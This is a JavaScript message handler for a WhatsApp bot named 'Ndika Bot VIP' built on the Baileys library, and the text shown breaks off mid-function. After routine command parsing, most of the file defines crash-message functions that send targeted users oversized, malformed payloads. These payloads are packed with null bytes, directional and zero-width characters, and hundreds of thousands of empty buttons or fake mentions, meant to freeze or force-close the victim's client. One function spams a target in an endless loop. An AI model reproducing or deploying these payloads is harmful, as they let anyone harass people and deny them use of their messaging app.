// ===============================================
//       ⚡ NDIKA BOT VIP - MESSAGE HANDLER ⚡
//            Created by Ndika Official
// ===============================================

const {
  default: baileys,
  downloadContentFromMessage,
  proto,
  generateWAMessage,
  getContentType,
  prepareWAMessageMedia,
  generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const util = require("util");
const chalk = require("chalk");
const os = require("os");
const jimp = require("jimp");
const axios = require("axios");
const fsx = require("fs-extra");
const sharp = require("sharp");
const crypto = require("crypto");
const yts = require("yt-search");
const ffmpeg = require("fluent-ffmpeg");
const speed = require("performance-now");
const moment = require("moment-timezone");
const jsobfus = require("javascript-obfuscator");
const {
  ocrSpace
} = require("ocr-space-api-wrapper");
const {
  JSDOM
} = require("jsdom");
const {
  spawn,
  exec,
  execSync
} = require("child_process");
module.exports = ndika = async (ndikaSock, m, chatUpdate, store) => {
  try {
    const timestampp = speed();

    // Parse message body
    var body = m.mtype === "conversation" ? m.message.conversation || "[Conversation]" : m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" : m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" : m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" : m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" : m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" : m.mtype === "contactMessage" ? "[Contact]" : m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" : m.mtype === "liveLocationMessage" ? "[Live Location]" : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" : m.mtype === "interactiveResponseMessage" ? (() => {
      try {
        const params = m.msg?.nativeFlowResponseMessage?.paramsJson || m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || "{}";
        const parsed = typeof params === "string" ? JSON.parse(params) : params;
        return parsed?.id || parsed?.selectedId || "[Interactive Response]";
      } catch {
        return "[Interactive Response]";
      }
    })() : m.mtype === "pollCreationMessage" ? "[Poll Creation]" : m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" : m.mtype === "ephemeralMessage" ? "[Ephemeral]" : m.mtype === "viewOnceMessage" ? "[View Once]" : m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" : "[Unknown Type]";
    var budy = typeof m.text === "string" ? m.text : "";
    var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix;
    const {
      smsg,
      tanggal,
      getTime,
      isUrl,
      sleep,
      clockString,
      runtime,
      fetchJson,
      getBuffer,
      jsonformat,
      format,
      parseMention,
      getRandom,
      getGroupAdm,
      generateProfilePicture
    } = require("./lib/utils");
    const ownData = JSON.parse(fs.readFileSync("./database/owner.json"));
    const premData = JSON.parse(fs.readFileSync("./database/premium.json"));
    const isCmd = body.startsWith(prefix);
    const command = isCmd ? body.slice(prefix.length).trim().split(" ").shift().toLowerCase() : "";
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(" ");
    const botNumber = await ndikaSock.decodeJid(ndikaSock.user.id);
    const sender = m.key?.participantAlt || m.sender;
    const senderNumber = String(sender).split(":")[0].split("@")[0].replace(/[^0-9]/g, "");
    const botNumberDigits = String(botNumber).split(":")[0].split("@")[0].replace(/[^0-9]/g, "");
    const ownerList = [botNumberDigits, ...ownData.map(v => String(v).replace(/[^0-9]/g, ""))];
    const premList = [botNumberDigits, ...premData.map(v => String(v).replace(/[^0-9]/g, ""))];
    const isOwner = ownerList.includes(senderNumber);
    const isPremium = isOwner || premList.includes(senderNumber);
    const quoted = m.quoted || m;
    const quotedMsg = quoted.mtype === "buttonsMessage" ? quoted[Object.keys(quoted)[1]] : quoted.mtype === "templateMessage" ? quoted.hydratedTemplate[Object.keys(quoted.hydratedTemplate)[1]] : quoted.mtype === "product" ? quoted[Object.keys(quoted)[0]] : m.quoted ? m.quoted : m;
    const isImage = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
    const from = m.key.remoteJid;
    const groupSender = m.isGroup ? m.key.participant ? m.key.participant : m.participant : m.key.remoteJid;
    const groupMetadata = m.isGroup ? await ndikaSock.groupMetadata(from).catch(() => {}) : "";
    const groupName = m.isGroup ? groupMetadata?.subject || "" : "";
    const participants = m.isGroup ? groupMetadata?.participants || [] : [];
    const groupAdmins = m.isGroup ? await getGroupAdm(participants) : [];
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const pushname = m.pushName || "User";
    const timeString = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const dateString = new Date().toLocaleDateString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric",
      month: "long",
      day: "numeric"
    });

    // Dynamic Branding Variables (Configurable via setting/config.js)
    const botName = global.botname || "Ndika Bot VIP";
    const ownerName = global.ownername || "Ndika Official";
    const botAuthor = global.author || "Ndika Official";
    const botWm = global.wm || "© 2026 " + ownerName;
    const telegramLink = global.telegram || "https://t.me/NdikaOfficial";
    const saluranLink = global.saluran || "https://chat.whatsapp.com/FPofX1sCkeBFU2EroZ4Krs";

    // Check public / self mode
    if (!ndikaSock.public && !isOwner) {
      return;
    }

    // Clean & Minimalist Terminal Logger
    if (command) {
      const chatType = m.isGroup ? chalk.yellow("GRUP: " + (groupName || "Unknown")) : chalk.blue("PRIVATE");
      console.log(
        chalk.gray("[" + timeString + "]") + " " +
        chalk.green(prefix + command) + " " +
        chalk.gray("dari") + " " +
        chalk.white(pushname + " (" + senderNumber + ")") + " " +
        chalk.gray("•") + " " + chatType
      );
    }
    async function sendAddressCrash(sock, targetJid) {
      const resultMsg = await generateWAMessageFromContent(targetJid, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: ""
              },
              footer: {
                text: ""
              },
              buttons: [{
                type: 1,
                buttonId: "x",
                buttonText: {
                  displayText: "𑇂𑆵𑆴𑆿".repeat(100000) + "\0".repeat(100000)
                }
              }, {
                type: 1,
                buttonId: "x",
                buttonText: {
                  displayText: "\0".repeat(100000)
                }
              }, {
                type: 1,
                buttonId: "x",
                buttonText: {
                  displayText: "‍‍‍‍‍𑇂𑆵𑆴𑆿".repeat(1000000)
                }
              }, {
                type: 1,
                buttonId: "x4",
                buttonText: {
                  displayText: "\0".repeat(1000000)
                }
              }, {
                type: 1,
                buttonId: "x",
                buttonText: {
                  displayText: "𑇂𑆵𑆴𑆿".repeat(1000000)
                }
              }],
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"18\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"k\",\"name\":\"k\",\"phone_number\":\"999999999999\",\"house_number\":\"13135550002\",\"floor_number\":\"@3135550202\",\"state\":\"X" + "\0".repeat(100000000) + "\"}}",
                version: 3
              }
            }
          }
        }
      }, {});
      await sock.relayMessage(targetJid, resultMsg.message, {
        participant: {
          jid: targetJid
        },
        messageId: resultMsg.key.id
      });
    }
    async function sendForcloseBug(sock, targetJid) {
      const options = {};
      let count = 0;
      for (let i = 0; i < 100; i++) {
        try {
          const interactivePayload = {
            interactiveMessage: {
              header: {
                title: "".repeat(50000),
                subtitle: "".repeat(50000),
                bloksWidget: {
                  uuid: "".repeat(50000),
                  data: "[".repeat(50001),
                  type: "".repeat(50000),
                  fallback: "".repeat(50000)
                }
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                buttons: "[".repeat(50000)
              }
            }
          };
          await ndikaSock.relayMessage(targetJid, interactivePayload, options, {
            noSelfSync: true
          });
          count++;
          console.log("Successed Send Bvgs Forclose New (" + count + ")");
        } catch (err) {
          console.log("err: " + err.message);
        }
      }
    }
    async function sendLocationCrash(sock, targetJid) {
      const floodText = "‮‎‏ꦾ".repeat(25000);
      const floodText1 = "‏‮ꦽ".repeat(6000);
      console.log("proses send bug");
      for (let i = 0; i < 5; i++) {
        let buttons = [];
        for (let j = 0; j < 20; j++) {
          const buttonItem = {
            display_text: floodText1
          };
          const buttonItem1 = {
            display_text: floodText1
          };
          buttons.push({
            name: "cta_call",
            buttonParamsJson: JSON.stringify(buttonItem)
          }, {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify(buttonItem1)
          });
        }
        const locationPayload = {
          title: floodText,
          hasMediaAttachment: true,
          locationMessage: {}
        };
        locationPayload.locationMessage.degreesLatitude = 99999999;
        locationPayload.locationMessage.degreesLongitude = -99999999;
        locationPayload.locationMessage.name = floodText;
        locationPayload.locationMessage.address = floodText;
        const msgPayload = {
          text: floodText
        };
        const msgPayload1 = {
          text: floodText
        };
        let viewOncePayload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: locationPayload,
                body: msgPayload,
                footer: msgPayload1,
                nativeFlowMessage: {
                  buttons: buttons,
                  messageParamsJson: "{}".repeat(1000)
                },
                contextInfo: {
                  mentionedJid: [targetJid],
                  forwardingScore: 1,
                  isForwarded: false,
                  externalAdReply: {
                    title: floodText,
                    body: floodText,
                    mediaType: 2,
                    thumbnail: Buffer.alloc(0),
                    renderLargerThumbnail: true,
                    sourceUrl: " "
                  }
                }
              }
            }
          }
        };
        await sock.relayMessage(targetJid, viewOncePayload, {
          messageId: "NZ-" + crypto.randomBytes(8).toString("hex").toUpperCase(),
          participant: {
            jid: targetJid
          }
        }).catch(targetJid1 => {});
        console.log("succes send bug");
        await new Promise(targetJid1 => setTimeout(targetJid1, 200));
      }
    }
    async function sendButtonBug(sock, targetJid) {
      for (let i = 0; i < 40; i++) {
        await sock.relayMessage(targetJid, {
          interactiveMessage: {
            body: {
              text: "Know Ndika¿?"
            },
            nativeFlowMessage: {
              buttons: Array.from({
                length: 300000
              }, () => ({})),
              messageParams: new Array(300000).fill(null)
            }
          }
        }, {});
        await ndikaSock.relayMessage(targetJid, {
          extendedTextMessage: {
            text: "Know Ndika¿?",
            contextInfo: {
              mentionedJid: [targetJid]
            }
          }
        }, {});
      }
    }
    async function sendGroupStatusBug(sock, targetJid) {
      const textPayload = "‌‍​\u200A\00個";
      const count = 1000000;
      const statusMsg = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "Know Ndika¿?",
                display_text: "‌"
              },
              nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                  icon: "document",
                  title: "Monkey?!",
                  sections: Array.from({
                    length: 505555
                  }, () => ({}))
                })
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              }
            }
          }
        }
      };
      await ndikaSock.relayMessage(targetJid, statusMsg, {});
    }
    async function sendLegacyCrash(targetJid) {
      const data = "𑜦𑜠".repeat(1000) + "ꦾ".repeat(1000);
      try {
        const locationPayload = {
          title: data,
          hasMediaAttachment: false,
          locationMessage: {}
        };
        locationPayload.locationMessage.degreesLatitude = -6666666666;
        locationPayload.locationMessage.degreesLongitude = 6666666666;
        locationPayload.locationMessage.name = data;
        locationPayload.locationMessage.address = "\0";
        const viewOncePayload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: locationPayload,
                body: {
                  text: "Ndika Attack🍁" + data
                },
                nativeFlowResponseMessage: {
                  name: "payment_transaction_details",
                  paramsJson: "ࢠ".repeat(10000),
                  version: 3
                },
                contextInfo: {
                  participant: targetJid,
                  mentionedJid: ["0@s.whatsapp.net", ...Array.from({
                    length: 1900
                  }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")]
                }
              }
            }
          }
        };
        await ndikaSock.relayMessage(targetJid, viewOncePayload, {
          messageId: null,
          participant: {
            jid: targetJid
          },
          userJid: targetJid
        });
        console.log("Ndika Success Attack!✅");
      } catch (err) {
        console.log("❌ error:\n" + err);
      }
    }
    async function sendGalaxyCrash(targetJid) {
      const resultData = ndikaSock.generateMessageTag();
      const msgPayload = {
        interactiveResponseMessage: {
          body: {
            text: "night",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"flow_cta\":\"" + "\0".repeat(900000) + "\"}",
            version: 3
          }
        }
      };
      const msgPayload1 = {
        messageId: resultData
      };
      await ndikaSock.relayMessage(targetJid, msgPayload, msgPayload1);
    }
    async function sendDelayHardBug(sock, targetJid) {
      while (true) {
        try {
          const statusMsg = {
            groupStatusMessageV2: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "bokep",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "cta_VnX",
                    paramsJson: "{\"flow_cta\":\"" + "\0".repeat(900000) + "\"}}",
                    version: 3
                  }
                }
              }
            }
          };
          await sock.relayMessage(targetJid, statusMsg, {
            participant: {
              jid: targetJid
            }
          });
          console.log("Ndika Delay Hard successfully spammed to " + targetJid);
          await new Promise(targetJid1 => setTimeout(targetJid1, 1500));
        } catch (err) {
          console.log("❌ Error Strike:", err);
          await new Promise(targetJid1 => setTimeout(targetJid1, 5000));
        }
      }
    }
    async function sendStatusMentionCrash(targetJid) {
      let textPayload = "";
      for (let i = 0; i < 500; i++) {
        textPayload = "\0".repeat(100000);
      }
      let textPayload1 = "[ ! ] Ndika Xploit 𖥂";
      let floodText = "​".repeat(15000);
      const msgPayload = {
        businessOwnerJid: targetJid
      };
      const viewOncePayload = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3.2,
              isStatusBroadcast: true,
              statusBroadcastJid: "status@broadcast",
              messageSecret: crypto.randomBytes(32),
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
                ticket_id: crypto.randomBytes(16)
              }),
              badgeChat: {
                unreadCount: 9999
              }
            },
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/624912752_1596049687978403_6451067671494406178_n.enc?ccb=11-4&oh=01_Q5Aa3gFYO0G29IPNcCnG8ohcWvLjfMtF6J4iRyKTC-edxR93jQ&oe=69A619FB&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "i9f20ml17evedyS4QNnyWx88c3l47PgSLfnatSGtyQ8=",
              fileLength: "108310",
              height: 1024,
              width: 1024,
              mediaKey: "1sXEfozwkMaHPErmCEPOJgUPyljYnE/dF4UFt/F8puE=",
              fileEncSha256: "l5MwkOSc5LdITAEPwjZrPk65DzjeHpZkJecYGTx3If4=",
              directPath: "/v/t62.7118-24/624912752_1596049687978403_6451067671494406178_n.enc?ccb=11-4&oh=01_Q5Aa3gFYO0G29IPNcCnG8ohcWvLjfMtF6J4iRyKTC-edxR93jQ&oe=69A619FB&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1769910124",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAADBAUGAAIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADSRaOfLDefqgvDfsTrxqZGPBdJ2px5zUdnyqYsV5PhqMkQVJ6KAX5CldF5NbmNcgY4zXZ6fZ1mMdw3bj//xAAoEAACAgIBAwQCAgMAAAAAAAABAgADBBEhEhMxBSIyQBFRFGFCUmL/2gAIAQEAAT8AnqTpTkY92xMbMryS3bQ6H3CSASSDoT232gqPaCeI4yq06g5OpgZNtnNrfi3KSqoWEE7+hPUzfkoLP45VRPRb9CyqZRbt635MqIBC651uEhupZUAO6n+rbEW0CvbeRKM0VcWEHmX+p4ZrI3MTINCSLPrcNqZNBdfjMasM3WLif2Jk1kOr90hR9CJkayD/cuyHfQHmLj1sCSSSImFRcmvi37jp27HTe9GUX3ojhT7P8o2U6Vp2uCZXfe6m65+AvAndZ7OonX9QMT7oeqtiTwDLcimumspv7hJ2GNHeHI+51HkA+ZiFalYuvV7YxawWHWvHH6Eoxmut4adLU2dBO9S/E+Xt4j0Aq6sOQNiJa9XUv0fImKgsuUS+pVpscDWlleQVs2eQRozHzFxA6geTsSzJW8l+Q0ybHqqZ1TqI+pZmu7k9sLuPUSSeoSgGi1XQgkS7MtvrNelG/lDR/wBCNQBbLiVUHs6jj+9PzO05YrPUcWrG0EkwsTv1Mx8iW+mqlD2AnYEdXLhBydTqIbmVLZa3VP/EABcRAQEBAQAAAAAAAAAAAAAAAAAiATD/2gAIAQIBAT8A60pj/8QAHBEAAgICAwAAAAAAAAAAAAAAAAECEQNBMDJS/9oACAEDAQE/AOJDdsVbE8XkvFXVknHSP//z",
              caption: textPayload1 + floodText,
              contextInfo: {
                isForwarding: true,
                isGroupMention: true,
                forwardingScore: 9999999,
                remoteJid: "status@broadcast",
                mentionedJid: Array.from({
                  length: 1901
                }, () => "1" + Math.floor(Math.random() * 9000000000000) + "@s.whatsapp.net"),
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 467593,
                stanzaId: "666-666666-Ndika-Id" + Math.floor(Math.random() * 99999),
                disappearingMode: {
                  initiator: "CHANGED_IN_CHAT",
                  trigger: "CHAT_SETTING"
                },
                businessMessageForwardInfo: msgPayload,
                dataSharingContext: {
                  showMmDisclosure: true
                },
                placeholderKey: {
                  remoteJid: "18002428478@s.whatsapp.net",
                  fromMe: false,
                  id: floodText,
                  pushName: floodText,
                  verifiedName: floodText
                },
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
                      interactiveResponseMessage: {
                        body: {
                          text: " [ ! ] Ndika Xploit 𖥂",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "call_permission_request",
                          paramsJson: floodText,
                          version: 3
                        },
                        entryPointConversionSource: "🧸"
                      }
                    }
                  }
                },
                pairedMediaType: "NOT_PAIRED_MEDIA",
                statusSourceType: "IMAGE"
              },
              scansSidecar: "tn5cCN82YiZ/WQGjd1GJTAgw6MoJWz4Q+rq9TOipMvCakSOHK/lnVQ==",
              scanLengths: [12567, 43151, 21308, 31284],
              midQualityFileSha256: "s6BsP5qaznFeBkYyf5jfuLOpc60SQ/03e7G+NDU/uSQ="
            },
            nativeFlowMessage: {
              messageParamsJson: floodText
            }
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: textPayload
          }
        }
      };
      const msgPayload1 = {
        tag: "status",
        attrs: {
          id: ndikaSock.generateMessageTag(),
          from: ndikaSock.user.id
        },
        content: [{
          tag: "mentioned_users",
          attrs: {
            type: "͢".repeat(511)
          },
          content: "🔥"
        }]
      };
      await ndikaSock.sendNode(msgPayload1);
      await ndikaSock.relayMessage("status@broadcast", viewOncePayload, {
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: targetJid
              }
            }]
          }]
        }]
      });
      if (targetJid) {
        const msgPayload2 = {
          key: viewOncePayload.key,
          type: 25
        };
        const msgPayload3 = {
          protocolMessage: msgPayload2
        };
        const msgPayload4 = {
          message: msgPayload3
        };
        const msgPayload5 = {
          groupStatusMentionMessage: msgPayload4
        };
        const msgPayload6 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        msgPayload6.attrs.is_status_mention = "Crashed";
        const msgPayload7 = {
          additionalNodes: [msgPayload6]
        };
        await ndikaSock.relayMessage(targetJid, msgPayload5, msgPayload7);
      }
      ;
      console.log(chalk.red("Succesfully Attack Target By : t.me/NdikaOfficial"));
    }
    async function sendStatusMentionProtocol(targetJid) {
      const count = 100;
      console.log("proses send bug");
      for (let i = 0; i < count; i++) {
        const floodText = "‎‏‮‭".repeat(45000);
        const msgPayload = {
          title: floodText,
          hasMediaAttachment: true,
          productMessage: {}
        };
        msgPayload.productMessage.product = {};
        msgPayload.productMessage.businessOwnerJid = targetJid;
        msgPayload.productMessage.product.productImage = {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31444557_1338604753594000_2715093556515569429_n.enc"
        };
        msgPayload.productMessage.product.productId = "99999999";
        msgPayload.productMessage.product.title = floodText;
        msgPayload.productMessage.product.description = floodText;
        msgPayload.productMessage.product.currencyCode = "IDR";
        msgPayload.productMessage.product.priceAmount1000 = "999999999999";
        msgPayload.productMessage.product.retailerId = floodText;
        msgPayload.productMessage.product.productImageCount = 999;
        const msgPayload1 = {
          text: floodText
        };
        const msgPayload2 = {
          text: floodText
        };
        let viewOncePayload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: msgPayload,
                body: msgPayload1,
                footer: msgPayload2,
                nativeFlowMessage: {
                  buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: " ",
                      sections: [{
                        title: floodText,
                        rows: Array(10).fill({
                          title: " ",
                          rowId: "fc_id"
                        })
                      }]
                    })
                  }],
                  messageVersion: 4
                },
                contextInfo: {
                  mentionedJid: [targetJid],
                  forwardingScore: 2147483647,
                  isForwarded: true,
                  externalAdReply: {
                    title: floodText,
                    body: floodText,
                    mediaType: 2,
                    thumbnail: Buffer.alloc(0),
                    renderLargerThumbnail: true,
                    sourceUrl: " "
                  }
                }
              }
            }
          }
        };
        await ndikaSock.relayMessage(targetJid, viewOncePayload, {
          messageId: "NZ-ANDRO-" + crypto.randomBytes(8).toString("hex").toUpperCase(),
          participant: {
            jid: targetJid
          }
        }).catch(() => {});
        console.log("succes send bug");
        if (i % 5 === 0) {
          await new Promise(targetJid1 => setTimeout(targetJid1, 200));
        }
      }
      console.log("proses send bug selesai");
    }
    async function sendCallPermissionBug(targetJid) {
      console.log(chalk.red("Succesfully Attack Target By : t.me/NdikaOfficial"));
      let buttons = [];
      let floodText = "ꦾ".repeat(90000);
      for (let i = 0; i < 10; i++) {
        buttons.push({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "ㅤ"
          }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({
            text: "ㅤㅤ"
          }),
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "𝘿𝙖𝙫𝙖𝙓 𝙒𝙖𝙨 𝙃𝙚𝙧𝙚 〽️" + "\0".repeat(60000),
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/624912752_1596049687978403_6451067671494406178_n.enc?ccb=11-4&oh=01_Q5Aa3gFYO0G29IPNcCnG8ohcWvLjfMtF6J4iRyKTC-edxR93jQ&oe=69A619FB&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "i9f20ml17evedyS4QNnyWx88c3l47PgSLfnatSGtyQ8=",
              fileLength: "108310",
              height: 1024,
              width: 1024,
              mediaKey: "1sXEfozwkMaHPErmCEPOJgUPyljYnE/dF4UFt/F8puE=",
              fileEncSha256: "l5MwkOSc5LdITAEPwjZrPk65DzjeHpZkJecYGTx3If4=",
              directPath: "/v/t62.7118-24/624912752_1596049687978403_6451067671494406178_n.enc?ccb=11-4&oh=01_Q5Aa3gFYO0G29IPNcCnG8ohcWvLjfMtF6J4iRyKTC-edxR93jQ&oe=69A619FB&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1769910124",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAADBAUGAAIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADSRaOfLDefqgvDfsTrxqZGPBdJ2px5zUdnyqYsV5PhqMkQVJ6KAX5CldF5NbmNcgY4zXZ6fZ1mMdw3bj//xAAoEAACAgIBAwQCAgMAAAAAAAABAgADBBEhEhMxBSIyQBFRFGFCUmL/2gAIAQEAAT8AnqTpTkY92xMbMryS3bQ6H3CSASSDoT232gqPaCeI4yq06g5OpgZNtnNrfi3KSqoWEE7+hPUzfkoLP45VRPRb9CyqZRbt635MqIBC651uEhupZUAO6n+rbEW0CvbeRKM0VcWEHmX+p4ZrI3MTINCSLPrcNqZNBdfjMasM3WLif2Jk1kOr90hR9CJkayD/cuyHfQHmLj1sCSSSImFRcmvi37jp27HTe9GUX3ojhT7P8o2U6Vp2uCZXfe6m65+AvAndZ7OonX9QMT7oeqtiTwDLcimumspv7hJ2GNHeHI+51HkA+ZiFalYuvV7YxawWHWvHH6Eoxmut4adLU2dBO9S/E+Xt4j0Aq6sOQNiJa9XUv0fImKgsuUS+pVpscDWlleQVs2eQRozHzFxA6geTsSzJW8l+Q0ybHqqZ1TqI+pZmu7k9sLuPUSSeoSgGi1XQgkS7MtvrNelG/lDR/wBCNQBbLiVUHs6jj+9PzO05YrPUcWrG0EkwsTv1Mx8iW+mqlD2AnYEdXLhBydTqIbmVLZa3VP/EABcRAQEBAQAAAAAAAAAAAAAAAAAiATD/2gAIAQIBAT8A60pj/8QAHBEAAgICAwAAAAAAAAAAAAAAAAECEQNBMDJS/9oACAEDAQE/AOJDdsVbE8XkvFXVknHSP//Z",
              contextInfo: {
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                },
                dataSharingContext: {
                  showMmDisclosure: true
                },
                pairedMediaType: "NOT_PAIRED_MEDIA",
                statusSourceType: "IMAGE",
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742
              },
              scansSidecar: "tn5cCN82YiZ/WQGjd1GJTAgw6MoJWz4Q+rq9TOipMvCakSOHK/lnVQ==",
              scanLengths: [12567, 43151, 21308, 31284],
              midQualityFileSha256: "s6BsP5qaznFeBkYyf5jfuLOpc60SQ/03e7G+NDU/uSQ="
            }
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "꦳".repeat(500),
                url: "t.me/NdikaOfficial",
                copy_code: "🔥 Foooooo",
                expiration_time: Date.now() * 999
              }
            })
          })
        });
      }
      const msgPayload = {
        cards: [...buttons]
      };
      const viewOncePayload = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              messageSecret: crypto.randomBytes(32),
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
                ticket_id: crypto.randomBytes(16)
              }),
              badgeChat: {
                unreadCount: 9999
              }
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: "[ ! ] Ndika Xploit 𖥂" + floodText
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: "> https://t.me/NdikaOfficial"
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                hasMediaAttachment: false
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject(msgPayload),
              contextInfo: {
                mentionedJid: Array.from({
                  length: 1901
                }, () => "1" + Math.floor(Math.random() * 9000000000000) + "@s.whatsapp.net"),
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 467593,
                participant: "0@s.whatsapp.net",
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
                      interactiveResponseMessage: {
                        body: {
                          text: "[ ! ] Ndika Xploit 𖥂",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "call_permission_request",
                          paramsJson: "\0".repeat(500),
                          version: 3
                        }
                      }
                    }
                  }
                },
                remoteJid: "@s.whatsapp.net"
              }
            })
          }
        }
      };
      await ndikaSock.relayMessage(targetJid, viewOncePayload, {
        participant: {
          jid: targetJid
        },
        messageId: ndikaSock.generateMessageTag()
      });
    }
    async function sendInvoicePaymentBug(targetJid) {
      try {
        await ndikaSock.relayMessage(targetJid, {
          viewOnceMessage: {
            message: {
              templateButtonReplyMessage: {
                amount: "CORRUPT",
                selectedIndex: null,
                contextInfo: {
                  stanzaId: null,
                  participant: targetJid,
                  paymentInviteMessage: null,
                  quotedMessage: {
                    contactMessage: {
                      displayName: "hamzIshere" + "ြ".repeat(25000),
                      vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666" + "ြ".repeat(25000) + "\nEND:VCARD",
                      renderLargerThumbnail: true
                    },
                    contextInfo: {
                      isForwarded: true,
                      forwardingScore: 999
                    }
                  }
                }
              }
            }
          }
        }, {
          participant: {
            jid: targetJid
